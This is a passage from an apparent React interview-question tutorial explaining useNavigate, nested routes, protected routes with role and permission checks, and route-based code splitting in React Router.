navigate('/page2', { replace: true });  // Replaces page1 in history

// Use replace for:
// - Login redirects
// - Error page redirects
// - Wizard/multi-step flows

Example: Multi-step Form
------------------------

function MultiStepForm() {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({});
  
  const nextStep = (data) => {
    setFormData({ ...formData, ...data });
    
    if (step === 3) {
      // Final step: submit and navigate
      submitForm({ ...formData, ...data });
      navigate('/success', { replace: true });
      // replace: true prevents going back to form
    } else {
      setStep(step + 1);
    }
  };
  
  const prevStep = () => {
    if (step > 1) {
      setStep(step - 1);
    } else {
      navigate(-1); // Go back to previous page
    }
  };
  
  return (
    <div>
      {step === 1 && <Step1 onNext={nextStep} />}
      {step === 2 && <Step2 onNext={nextStep} onBack={prevStep} />}
      {step === 3 && <Step3 onNext={nextStep} onBack={prevStep} />}
    </div>
  );
}

Example: Protected Route Redirect
----------------------------------

function ProtectedRoute({ children }) {
  const { isAuthenticated } = useAuth();
  const location = useLocation();
  
  if (!isAuthenticated) {
    // Save current location to redirect after login
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  return children;
}

function Login() {
  const navigate = useNavigate();
  const location = useLocation();
  
  const handleLogin = async (credentials) => {
    await loginAPI(credentials);
    
    // Redirect to where they came from
    const from = location.state?.from?.pathname || '/';
    navigate(from, { replace: true });
  };
  
  return <LoginForm onSubmit={handleLogin} />;
}

Relative Navigation:
--------------------

// Current URL: /users/123/posts
const navigate = useNavigate();

navigate('edit');        // /users/123/posts/edit
navigate('./edit');      // /users/123/posts/edit
navigate('../edit');     // /users/123/edit
navigate('../../admin'); // /users/admin
navigate('..');          // /users/123
navigate('/');           // /

// Use relative for nested routes
<Route path="users/:userId" element={<UserLayout />}>
  <Route path="profile" element={<Profile />} />
  <Route path="settings" element={<Settings />} />
</Route>

function Profile() {
  const navigate = useNavigate();
  
  const goToSettings = () => {
    navigate('../settings'); // Relative to /users/:userId
  };
  
  return <button onClick={goToSettings}>Settings</button>;
}

Preventing Navigation (v5 comparison):
---------------------------------------

// v5: useHistory + Prompt
import { useHistory, Prompt } from 'react-router-dom';

function Form() {
  const history = useHistory();
  const [hasUnsavedChanges, setHasUnsavedChanges] = useState(false);
  
  return (
    <>
      <Prompt
        when={hasUnsavedChanges}
        message="You have unsaved changes. Leave anyway?"
      />
      <form>{/* ... * /}</form>
    </>
  );
}

// v6: useBlocker (unstable API)
import { useBlocker } from 'react-router-dom';

function Form() {
  const [hasUnsavedChanges, setHasUnsavedChanges] = useState(false);
  
  useBlocker(() => {
    if (hasUnsavedChanges) {
      return !window.confirm('You have unsaved changes. Leave anyway?');
    }
    return false;
  });
  
  return <form>{/* ... * /}</form>;
}

// Or use native browser API
useEffect(() => {
  const handleBeforeUnload = (e) => {
    if (hasUnsavedChanges) {
      e.preventDefault();
      e.returnValue = '';
    }
  };
  
  window.addEventListener('beforeunload', handleBeforeUnload);
  return () => window.removeEventListener('beforeunload', handleBeforeUnload);
}, [hasUnsavedChanges]);

Navigate Component (declarative alternative):
----------------------------------------------

import { Navigate } from 'react-router-dom';

// Declarative redirect
function OldPage() {
  return <Navigate to="/new-page" replace />;
}

// Conditional redirect
function Dashboard() {
  const { isAuthenticated } = useAuth();
  
  if (!isAuthenticated) {
    return <Navigate to="/login" />;
  }
  
  return <div>Dashboard Content</div>;
}

// vs useNavigate (imperative)
function Dashboard() {
  const navigate = useNavigate();
  const { isAuthenticated } = useAuth();
  
  useEffect(() => {
    if (!isAuthenticated) {
      navigate('/login');
    }
  }, [isAuthenticated, navigate]);
  
  return <div>Dashboard Content</div>;
}

v5 to v6 Migration:
-------------------

// v5: useHistory
import { useHistory } from 'react-router-dom';

function Component() {
  const history = useHistory();
  
  history.push('/path');
  history.replace('/path');
  history.goBack();
  history.goForward();
  history.push('/path', { state: 'value' });
}

// v6: useNavigate
import { useNavigate } from 'react-router-dom';

function Component() {
  const navigate = useNavigate();
  
  navigate('/path');
  navigate('/path', { replace: true });
  navigate(-1);
  navigate(1);
  navigate('/path', { state: { state: 'value' } });
}

Summary:

useNavigate:
- Hook for programmatic navigation
- Returns navigate function
- navigate(path) - go to path
- navigate(-1) - go back
- navigate(1) - go forward
- Can pass state with navigation
- replace option to replace history
- Relative paths supported
- Use for: form submissions, authentication, conditional redirects

Use Link for user clicks, useNavigate for programmatic logic!
*/


/**
56. What are nested routes?
---------------------------

Nested routes are routes defined within other routes, creating a hierarchical URL
structure and component hierarchy. Child routes render inside parent routes using
the Outlet component.

Purpose:
- Shared layouts
- Hierarchical URLs
- Component composition
- Code organization

Basic Nested Routes:
--------------------

import { Routes, Route, Outlet, Link } from 'react-router-dom';

function App() {
  return (
    <Routes>
      {/* Parent route * /}
      <Route path="/" element={<Layout />}>
        {/* Child routes * /}
        <Route index element={<Home />} />
        <Route path="about" element={<About />} />
        <Route path="contact" element={<Contact />} />
      </Route>
    </Routes>
  );
}

// Layout component with Outlet
function Layout() {
  return (
    <div>
      <header>
        <nav>
          <Link to="/">Home</Link>
          <Link to="/about">About</Link>
          <Link to="/contact">Contact</Link>
        </nav>
      </header>
      
      <main>
        <Outlet />  {/* Child routes render here * /}
      </main>
      
      <footer>Footer</footer>
    </div>
  );
}

function Home() {
  return <h1>Home Page</h1>;
}

function About() {
  return <h1>About Page</h1>;
}

function Contact() {
  return <h1>Contact Page</h1>;
}

// URL Structure:
// / → Layout + Home
// /about → Layout + About
// /contact → Layout + Contact

Multi-Level Nesting:
--------------------

<Routes>
  <Route path="/" element={<Layout />}>
    <Route index element={<Home />} />
    
    {/* Products section * /}
    <Route path="products" element={<ProductsLayout />}>
      <Route index element={<ProductList />} />
      <Route path=":productId" element={<ProductDetail />} />
      <Route path=":productId/reviews" element={<ProductReviews />} />
      <Route path="new" element={<NewProduct />} />
    </Route>
    
    {/* Users section * /}
    <Route path="users" element={<UsersLayout />}>
      <Route index element={<UserList />} />
      <Route path=":userId" element={<UserProfile />} />
      <Route path=":userId/settings" element={<UserSettings />} />
    </Route>
  </Route>
</Routes>

// URL Structure:
// / → Layout + Home
// /products → Layout + ProductsLayout + ProductList
// /products/123 → Layout + ProductsLayout + ProductDetail
// /products/123/reviews → Layout + ProductsLayout + ProductReviews
// /users → Layout + UsersLayout + UserList
// /users/456 → Layout + UsersLayout + UserProfile

Index Routes:
-------------

// Index route = default child route
<Route path="products" element={<ProductsLayout />}>
  <Route index element={<ProductList />} />
  {/* Renders when URL is exactly /products * /}
  
  <Route path=":id" element={<ProductDetail />} />
  {/* Renders when URL is /products/:id * /}
</Route>

Real-World Example: Dashboard
------------------------------

function App() {
  return (
    <Routes>
      {/* Public routes * /}
      <Route path="/" element={<PublicLayout />}>
        <Route index element={<Home />} />
        <Route path="login" element={<Login />} />
        <Route path="register" element={<Register />} />
      </Route>
      
      {/* Dashboard routes (protected) * /}
      <Route path="dashboard" element={<DashboardLayout />}>
        <Route index element={<DashboardHome />} />
        
        {/* Analytics section * /}
        <Route path="analytics" element={<AnalyticsLayout />}>
          <Route index element={<AnalyticsOverview />} />
          <Route path="reports" element={<Reports />} />
          <Route path="charts" element={<Charts />} />
        </Route>
        
        {/* Settings section * /}
        <Route path="settings" element={<SettingsLayout />}>
          <Route index element={<GeneralSettings />} />
          <Route path="profile" element={<ProfileSettings />} />
          <Route path="security" element={<SecuritySettings />} />
          <Route path="billing" element={<BillingSettings />} />
        </Route>
        
        {/* Users section * /}
        <Route path="users" element={<UsersSection />}>
          <Route index element={<UserList />} />
          <Route path=":userId" element={<UserDetail />} />
          <Route path="new" element={<NewUser />} />
        </Route>
      </Route>
      
      {/* 404 * /}
      <Route path="*" element={<NotFound />} />
    </Routes>
  );
}

// Dashboard Layout (with sidebar)
function DashboardLayout() {
  return (
    <div className="dashboard">
      <Sidebar>
        <Link to="/dashboard">Home</Link>
        <Link to="/dashboard/analytics">Analytics</Link>
        <Link to="/dashboard/settings">Settings</Link>
        <Link to="/dashboard/users">Users</Link>
      </Sidebar>
      
      <main>
        <Outlet />  {/* Nested routes render here * /}
      </main>
    </div>
  );
}

// Analytics Layout (with sub-navigation)
function AnalyticsLayout() {
  return (
    <div>
      <nav>
        <Link to="/dashboard/analytics">Overview</Link>
        <Link to="/dashboard/analytics/reports">Reports</Link>
        <Link to="/dashboard/analytics/charts">Charts</Link>
      </nav>
      
      <div>
        <Outlet />  {/* Analytics sub-routes render here * /}
      </div>
    </div>
  );
}

// Settings Layout (tabs)
function SettingsLayout() {
  return (
    <div>
      <h1>Settings</h1>
      
      <nav className="tabs">
        <Link to="/dashboard/settings">General</Link>
        <Link to="/dashboard/settings/profile">Profile</Link>
        <Link to="/dashboard/settings/security">Security</Link>
        <Link to="/dashboard/settings/billing">Billing</Link>
      </nav>
      
      <div>
        <Outlet />  {/* Settings pages render here * /}
      </div>
    </div>
  );
}

Outlet Context (Passing Data):
-------------------------------

// Parent passes data to children via Outlet
function ProductsLayout() {
  const [products, setProducts] = useState([]);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    fetchProducts().then(data => {
      setProducts(data);
      setLoading(false);
    });
  }, []);
  
  return (
    <div>
      <h1>Products</h1>
      <Outlet context={{ products, loading }} />
    </div>
  );
}

// Child accesses context
import { useOutletContext } from 'react-router-dom';

function ProductList() {
  const { products, loading } = useOutletContext();
  
  if (loading) return <div>Loading...</div>;
  
  return (
    <ul>
      {products.map(product => (
        <li key={product.id}>{product.name}</li>
      ))}
    </ul>
  );
}

Relative Links in Nested Routes:
---------------------------------

function ProductsLayout() {
  return (
    <div>
      <nav>
        {/* Relative links (relative to current route) * /}
        <Link to="">List</Link>
        {/* Same as /products * /}
        
        <Link to="new">New Product</Link>
        {/* Same as /products/new * /}
        
        <Link to="../users">Users</Link>
        {/* Up one level: /users * /}
      </nav>
      
      <Outlet />
    </div>
  );
}

Nested Routes with Parameters:
-------------------------------

<Routes>
  <Route path="users" element={<UsersLayout />}>
    <Route index element={<UserList />} />
    
    {/* User detail with nested routes * /}
    <Route path=":userId" element={<UserLayout />}>
      <Route index element={<UserProfile />} />
      <Route path="posts" element={<UserPosts />} />
      <Route path="followers" element={<UserFollowers />} />
      <Route path="settings" element={<UserSettings />} />
    </Route>
  </Route>
</Routes>

function UserLayout() {
  const { userId } = useParams();
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    fetchUser(userId).then(setUser);
  }, [userId]);
  
  if (!user) return <div>Loading...</div>;
  
  return (
    <div>
      <header>
        <h1>{user.name}</h1>
        <nav>
          <Link to={`/users/${userId}`}>Profile</Link>
          <Link to={`/users/${userId}/posts`}>Posts</Link>
          <Link to={`/users/${userId}/followers`}>Followers</Link>
          <Link to={`/users/${userId}/settings`}>Settings</Link>
        </nav>
      </header>
      
      <Outlet context={{ user }} />
    </div>
  );
}

function UserPosts() {
  const { user } = useOutletContext();
  
  return (
    <div>
      <h2>{user.name}'s Posts</h2>
      {/* ... * /}
    </div>
  );
}

Pathless Routes (Layout-only):
-------------------------------

// Route without path (for grouping/layout only)
<Routes>
  <Route element={<AuthLayout />}>
    {/* All these routes use AuthLayout * /}
    <Route path="/login" element={<Login />} />
    <Route path="/register" element={<Register />} />
    <Route path="/forgot-password" element={<ForgotPassword />} />
  </Route>
  
  <Route element={<MainLayout />}>
    {/* All these use MainLayout * /}
    <Route path="/" element={<Home />} />
    <Route path="/about" element={<About />} />
  </Route>
</Routes>

function AuthLayout() {
  return (
    <div className="auth-page">
      <div className="auth-card">
        <Logo />
        <Outlet />  {/* Login/Register/etc renders here * /}
      </div>
    </div>
  );
}

Route Object Configuration:
----------------------------

import { useRoutes } from 'react-router-dom';

function App() {
  const routes = useRoutes([
    {
      path: '/',
      element: <Layout />,
      children: [
        { index: true, element: <Home /> },
        { path: 'about', element: <About /> },
        {
          path: 'products',
          element: <ProductsLayout />,
          children: [
            { index: true, element: <ProductList /> },
            { path: ':id', element: <ProductDetail /> },
            { path: 'new', element: <NewProduct /> }
          ]
        }
      ]
    }
  ]);
  
  return routes;
}

Benefits of Nested Routes:
---------------------------

1. Shared Layouts
   - Header/footer/sidebar shared across pages
   - DRY (Don't Repeat Yourself)

2. Code Organization
   - Logical grouping of related routes
   - Easier to understand structure

3. URL Hierarchy
   - /dashboard/analytics/reports reflects structure
   - Intuitive navigation

4. Component Composition
   - Layouts wrap content
   - Reusable components

5. Context Sharing
   - Parent can provide data to children via Outlet context

6. Performance
   - Can lazy load nested routes
   - Only load what's needed

Lazy Loading with Nested Routes:
---------------------------------

import { lazy, Suspense } from 'react';

const Dashboard = lazy(() => import('./Dashboard'));
const Analytics = lazy(() => import('./Analytics'));
const Settings = lazy(() => import('./Settings'));

<Routes>
  <Route path="/" element={<Layout />}>
    <Route path="dashboard" element={
      <Suspense fallback={<Loading />}>
        <Dashboard />
      </Suspense>
    }>
      <Route path="analytics" element={
        <Suspense fallback={<Loading />}>
          <Analytics />
        </Suspense>
      } />
      <Route path="settings" element={
        <Suspense fallback={<Loading />}>
          <Settings />
        </Suspense>
      } />
    </Route>
  </Route>
</Routes>

Summary:

Nested Routes:
- Routes within routes
- Create URL hierarchy (/parent/child)
- Share layouts with Outlet
- Index routes for default child
- Outlet context for passing data
- Relative links and navigation
- Multiple levels of nesting
- Pathless routes for layouts
- Code organization and composition
- Essential for complex apps
*/


/**
57. What are protected routes and how do you implement them?
------------------------------------------------------------

Protected routes (also called private routes or auth routes) restrict access to certain
pages based on authentication or authorization. Unauthenticated users are redirected
to login.

Purpose:
- Protect sensitive pages (dashboard, profile, admin)
- Enforce authentication
- Handle authorization (roles, permissions)
- Redirect unauthorized users

Basic Protected Route:
----------------------

import { Navigate, useLocation } from 'react-router-dom';

function ProtectedRoute({ children }) {
  const { isAuthenticated } = useAuth();  // Custom auth hook
  const location = useLocation();
  
  if (!isAuthenticated) {
    // Redirect to login, save current location
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  return children;
}

// Usage
<Routes>
  <Route path="/login" element={<Login />} />
  
  <Route path="/dashboard" element={
    <ProtectedRoute>
      <Dashboard />
    </ProtectedRoute>
  } />
  
  <Route path="/profile" element={
    <ProtectedRoute>
      <Profile />
    </ProtectedRoute>
  } />
</Routes>

Auth Context Setup:
-------------------

import { createContext, useContext, useState, useEffect } from 'react';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    // Check if user is logged in (check token, etc.)
    checkAuthStatus()
      .then(user => setUser(user))
      .catch(() => setUser(null))
      .finally(() => setLoading(false));
  }, []);
  
  const login = async (credentials) => {
    const user = await loginAPI(credentials);
    setUser(user);
    localStorage.setItem('token', user.token);
  };
  
  const logout = () => {
    setUser(null);
    localStorage.removeItem('token');
  };
  
  const value = {
    user,
    isAuthenticated: !!user,
    loading,
    login,
    logout
  };
  
  return (
    <AuthContext.Provider value={value}>
      {loading ? <LoadingScreen /> : children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}

Complete Protected Route with Loading:
---------------------------------------

function ProtectedRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();
  const location = useLocation();
  
  // Show loading while checking auth
  if (loading) {
    return <LoadingSpinner />;
  }
  
  // Redirect to login if not authenticated
  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  // Render protected content
  return children;
}

Login with Redirect Back:
--------------------------

function Login() {
  const { login } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  
  const from = location.state?.from?.pathname || '/dashboard';
  
  const handleSubmit = async (credentials) => {
    await login(credentials);
    
    // Redirect to where they came from (or dashboard)
    navigate(from, { replace: true });
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input name="email" type="email" />
      <input name="password" type="password" />
      <button type="submit">Login</button>
    </form>
  );
}

Role-Based Protected Routes:
-----------------------------

function ProtectedRoute({ children, allowedRoles }) {
  const { user, isAuthenticated, loading } = useAuth();
  const location = useLocation();
  
  if (loading) {
    return <LoadingSpinner />;
  }
  
  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  // Check if user has required role
  if (allowedRoles && !allowedRoles.includes(user.role)) {
    return <Navigate to="/unauthorized" replace />;
  }
  
  return children;
}

// Usage
<Routes>
  {/* Anyone can access * /}
  <Route path="/" element={<Home />} />
  <Route path="/login" element={<Login />} />
  
  {/* Only authenticated users * /}
  <Route path="/dashboard" element={
    <ProtectedRoute>
      <Dashboard />
    </ProtectedRoute>
  } />
  
  {/* Only admins * /}
  <Route path="/admin" element={
    <ProtectedRoute allowedRoles={['admin']}>
      <AdminPanel />
    </ProtectedRoute>
  } />
  
  {/* Admin or moderator * /}
  <Route path="/moderation" element={
    <ProtectedRoute allowedRoles={['admin', 'moderator']}>
      <ModerationPanel />
    </ProtectedRoute>
  } />
</Routes>

Layout-Based Protection:
-------------------------

// Protect entire section
<Routes>
  <Route path="/" element={<PublicLayout />}>
    <Route index element={<Home />} />
    <Route path="about" element={<About />} />
    <Route path="login" element={<Login />} />
  </Route>
  
  <Route path="/dashboard" element={
    <ProtectedRoute>
      <DashboardLayout />
    </ProtectedRoute>
  }>
    {/* All nested routes automatically protected * /}
    <Route index element={<DashboardHome />} />
    <Route path="profile" element={<Profile />} />
    <Route path="settings" element={<Settings />} />
    <Route path="analytics" element={<Analytics />} />
  </Route>
</Routes>

Permission-Based Protection:
-----------------------------

function ProtectedRoute({ children, requiredPermission }) {
  const { user, isAuthenticated, loading } = useAuth();
  const location = useLocation();
  
  if (loading) {
    return <LoadingSpinner />;
  }
  
  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  // Check specific permission
  if (requiredPermission && !user.permissions.includes(requiredPermission)) {
    return <div>You don't have permission to access this page.</div>;
  }
  
  return children;
}

// Usage
<Route path="/users/delete" element={
  <ProtectedRoute requiredPermission="users.delete">
    <DeleteUser />
  </ProtectedRoute>
} />

<Route path="/posts/create" element={
  <ProtectedRoute requiredPermission="posts.create">
    <CreatePost />
  </ProtectedRoute>
} />

Reusable Route Components:
---------------------------

// Public-only routes (redirect if logged in)
function PublicRoute({ children }) {
  const { isAuthenticated } = useAuth();
  
  if (isAuthenticated) {
    return <Navigate to="/dashboard" replace />;
  }
  
  return children;
}

// Guest routes (login/register)
<Route path="/login" element={
  <PublicRoute>
    <Login />
  </PublicRoute>
} />

<Route path="/register" element={
  <PublicRoute>
    <Register />
  </PublicRoute>
} />

Multiple Protection Layers:
----------------------------

function ProtectedRoute({ children, requireAuth = true, allowedRoles, requiredPermissions }) {
  const { user, isAuthenticated, loading } = useAuth();
  const location = useLocation();
  
  if (loading) {
    return <LoadingSpinner />;
  }
  
  // Check authentication
  if (requireAuth && !isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  // Check role
  if (allowedRoles && !allowedRoles.includes(user?.role)) {
    return <Navigate to="/unauthorized" replace />;
  }
  
  // Check permissions
  if (requiredPermissions) {
    const hasPermissions = requiredPermissions.every(
      perm => user?.permissions.includes(perm)
    );
    
    if (!hasPermissions) {
      return <div>Insufficient permissions</div>;
    }
  }
  
  return children;
}

// Usage
<Route path="/admin/users" element={
  <ProtectedRoute
    requireAuth={true}
    allowedRoles={['admin', 'superadmin']}
    requiredPermissions={['users.view', 'users.edit']}
  >
    <UserManagement />
  </ProtectedRoute>
} />

Route Configuration with Protection:
-------------------------------------

const routes = [
  {
    path: '/',
    element: <PublicLayout />,
    children: [
      { index: true, element: <Home /> },
      { path: 'login', element: <Login /> },
      { path: 'register', element: <Register /> }
    ]
  },
  {
    path: '/dashboard',
    element: <ProtectedRoute><DashboardLayout /></ProtectedRoute>,
    children: [
      { index: true, element: <DashboardHome /> },
      { path: 'profile', element: <Profile /> },
      {
        path: 'admin',
        element: <ProtectedRoute allowedRoles={['admin']}><AdminLayout /></ProtectedRoute>,
        children: [
          { path: 'users', element: <UserManagement /> },
          { path: 'settings', element: <AdminSettings /> }
        ]
      }
    ]
  }
];

function App() {
  return useRoutes(routes);
}

Token Refresh on Protected Routes:
-----------------------------------

function ProtectedRoute({ children }) {
  const { isAuthenticated, refreshToken, loading } = useAuth();
  const location = useLocation();
  const [isRefreshing, setIsRefreshing] = useState(false);
  
  useEffect(() => {
    // Try to refresh token if expired
    if (isAuthenticated && isTokenExpired()) {
      setIsRefreshing(true);
      refreshToken()
        .catch(() => {
          // Refresh failed, redirect to login
          navigate('/login', { state: { from: location }, replace: true });
        })
        .finally(() => setIsRefreshing(false));
    }
  }, [location]);
  
  if (loading || isRefreshing) {
    return <LoadingSpinner />;
  }
  
  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  return children;
}

Protected API Routes:
---------------------

// Axios interceptor for protected API calls
import axios from 'axios';

axios.interceptors.request.use(
  (config) => {
    const token = localStorage.getItem('token');
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

axios.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      // Unauthorized - redirect to login
      localStorage.removeItem('token');
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);

Component-Level Protection:
----------------------------

// Protect specific components/actions within a page
function Dashboard() {
  const { user } = useAuth();
  
  return (
    <div>
      <h1>Dashboard</h1>
      
      {/* All users see this * /}
      <UserStats />
      
      {/* Only admins see this * /}
      {user.role === 'admin' && (
        <AdminPanel />
      )}
      
      {/* Only users with permission * /}
      {user.permissions.includes('posts.create') && (
        <button>Create Post</button>
      )}
    </div>
  );
}

Testing Protected Routes:
--------------------------

import { render, screen } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';

test('redirects to login when not authenticated', () => {
  render(
    <AuthProvider value={{ isAuthenticated: false, loading: false }}>
      <MemoryRouter initialEntries={['/dashboard']}>
        <Routes>
          <Route path="/login" element={<div>Login Page</div>} />
          <Route path="/dashboard" element={
            <ProtectedRoute>
              <div>Dashboard</div>
            </ProtectedRoute>
          } />
        </Routes>
      </MemoryRouter>
    </AuthProvider>
  );
  
  expect(screen.getByText('Login Page')).toBeInTheDocument();
});

test('renders protected content when authenticated', () => {
  render(
    <AuthProvider value={{ isAuthenticated: true, loading: false, user: { role: 'user' } }}>
      <MemoryRouter initialEntries={['/dashboard']}>
        <Routes>
          <Route path="/dashboard" element={
            <ProtectedRoute>
              <div>Dashboard</div>
            </ProtectedRoute>
          } />
        </Routes>
      </MemoryRouter>
    </AuthProvider>
  );
  
  expect(screen.getByText('Dashboard')).toBeInTheDocument();
});

Summary:

Protected Routes:
- Restrict access based on authentication
- Redirect unauthorized users to login
- Support role-based access control (RBAC)
- Support permission-based access
- Handle loading states
- Preserve attempted URL for redirect after login
- Can wrap individual routes or entire sections
- Essential for secure applications
- Combine with auth context for state management
*/


/**
58. What is code splitting in React Router?
-------------------------------------------

Code splitting in React Router is the technique of splitting your app into smaller
chunks that are loaded on-demand, reducing initial bundle size and improving
performance. Routes are loaded only when needed.

Purpose:
- Reduce initial bundle size
- Faster initial page load
- Load routes on-demand
- Better performance for large apps
- Improved user experience

Basic Code Splitting:
---------------------

import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// Lazy load components
const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Profile = lazy(() => import('./pages/Profile'));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<LoadingSpinner />}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/about" element={<About />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/profile" element={<Profile />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// Loading fallback
function LoadingSpinner() {
  return <div>Loading...</div>;
}

Without Code Splitting:
------------------------

// All components imported immediately
import Home from './pages/Home';
import About from './pages/About';
import Dashboard from './pages/Dashboard';
import Profile from './pages/Profile';

// Result: Large initial bundle
// bundle.js: 500KB (includes all pages)

With Code Splitting:
--------------------

// Lazy imports
const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Profile = lazy(() => import('./pages/Profile'));

// Result: Smaller initial bundle + separate chunks
// bundle.js: 100KB (main app)
// Home.chunk.js: 50KB (loaded when visiting /)
// About.chunk.js: 30KB (loaded when visiting /about)
// Dashboard.chunk.js: 200KB (loaded when visiting /dashboard)
// Profile.chunk.js: 120KB (loaded when visiting /profile)

Multiple Suspense Boundaries:
------------------------------

function App() {
  return (
    <BrowserRouter>
      <Layout>
        <Suspense fallback={<PageLoader />}>
          <Routes>
            {/* Public routes * /}
            <Route path="/" element={<Home />} />
            <Route path="/about" element={<About />} />
            
            {/* Dashboard with its own Suspense * /}
            <Route path="/dashboard" element={
              <Suspense fallback={<DashboardLoader />}>
                <Dashboard />
              </Suspense>
            } />
            
            {/* Admin with its own Suspense * /}
            <Route path="/admin" element={
              <Suspense fallback={<AdminLoader />}>
                <AdminPanel />
              </Suspense>
            } />
          </Routes>
        </Suspense>
      </Layout>
    </BrowserRouter>
  );
}

Nested Route Code Splitting:
-----------------------------

const Dashboard = lazy(() => import('./pages/Dashboard'));
const Analytics = lazy(() => import('./pages/Dashboard/Analytics'));
const Reports = lazy(() => import('./pages/Dashboard/Reports'));
const Settings = lazy(() => import('./pages/Dashboard/Settings'));

function App() {
  return (
    <Routes>
      <Route path="/dashboard" element={
        <Suspense fallback={<Loading />}>
          <Dashboard />
        </Suspense>
      }>
        {/* Nested routes also lazy loaded * /}
        <Route path="analytics" element={
          <Suspense fallback={<Loading />}>
            <Analytics />
          </Suspense>
        } />
        
        <Route path="reports" element={
          <Suspense fallback={<Loading />}>
            <Reports />
          </Suspense>
        } />
        
        <Route path="settings" element={
          <Suspense fallback={<Loading />}>
            <Settings />
          </Suspense>
        } />
      </Route>
    </Routes>
  );
}

Preloading Routes:
------------------

// Preload component before user navigates
const Dashboard = lazy(() => import('./pages/Dashboard'));

function Home() {
  // Preload Dashboard when user hovers over link
  const handleMouseEnter = () => {
    import('./pages/Dashboard');  // Starts loading
  };
  
  return (
    <div>
      <h1>Home</h1>
      <Link
        to="/dashboard"
        onMouseEnter={handleMouseEnter}
      >
        Dashboard
      </Link>
    </div>
  );
}

// Or preload after a delay
useEffect(() => {
  setTimeout(() => {
    import('./pages/Dashboard');  // Preload in background
  }, 3000);
}, []);

Error Boundaries with Code Splitting:
--------------------------------------

import { Component } from 'react';

class ErrorBoundary extends Component {
  state = { hasError: false };
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    console.error('Lazy loading error:', error, errorInfo);
  }
  
  render() {
    if (this.state.hasError) {
      return (
        <div>
          <h1>Failed to load page</h1>
          <button onClick={() => window.location.reload()}>
            Reload
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

// Usage
function App() {
  return (
    <BrowserRouter>
      <ErrorBoundary>
        <Suspense fallback={<Loading />}>
          <Routes>
            <Route path="/" element={<Home />} />
            <Route path="/dashboard" element={<Dashboard />} />
          </Routes>
        </Suspense>
      </ErrorBoundary>
    </BrowserRouter>
  );
}

Route-based Code Splitting Pattern:
------------------------------------

// routes.js
export const routes = [
  {
    path: '/',
    component: lazy(() => import('./pages/Home')),
    exact: true
  },
  {
    path: '/about',
    component: lazy(() => import('./pages/About'))
  },
  {
    path: '/dashboard',
    component: lazy(() => import('./pages/Dashboard')),
    protected: true
  },
  {
    path: '/admin',
    component: lazy(() => import('./pages/Admin')),
    protected: true,
    roles: ['admin']
  }
];

// App.js
import { routes } from './routes';

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<Loading />}>
        <Routes>
          {routes.map(({ path, component: Component, protected, roles }) => (
            <Route
              key={path}
              path={path}
              element={
                protected ? (
                  <ProtectedRoute allowedRoles={roles}>
                    <Component />
                  </ProtectedRoute>
                ) : (
                  <Component />
                )
              }
            />
          ))}
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

Component-Level Splitting:
---------------------------

// Split large components too, not just routes
const Home = lazy(() => import('./pages/Home'));
const HeavyChart = lazy(() => import('./components/HeavyChart'));
const VideoPlayer = lazy(() => import('./components/VideoPlayer'));

function Dashboard() {
  const [showChart, setShowChart] = useState(false);
  
  return (
    <div>
      <h1>Dashboard</h1>
      
      <button onClick={() => setShowChart(true)}>
        Show Chart
      </button>
      
      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <HeavyChart />
        </Suspense>
      )}
    </div>
  );
}

Real-World Example:
-------------------

import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

// Immediately loaded (small, always needed)
import Layout from './components/Layout';
import NotFound from './pages/NotFound';

// Lazy loaded (large, not always needed)
const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));
const Contact = lazy(() => import('./pages/Contact'));

// Dashboard section (large feature)
const Dashboard = lazy(() => import('./pages/Dashboard'));
const DashboardHome = lazy(() => import('./pages/Dashboard/Home'));
const Analytics = lazy(() => import('./pages/Dashboard/Analytics'));
const Reports = lazy(() => import('./pages/Dashboard/Reports'));

// Admin section (rarely accessed)
const Admin = lazy(() => import('./pages/Admin'));
const Users = lazy(() => import('./pages/Admin/Users'));
const Settings = lazy(() => import('./pages/Admin/Settings'));

// Shop section
const Shop = lazy(() => import('./pages/Shop'));
const ProductList = lazy(() => import('./pages/Shop/ProductList'));
const ProductDetail = lazy(() => import('./pages/Shop/ProductDetail'));
const Cart = lazy(() => import('./pages/Shop/Cart'));
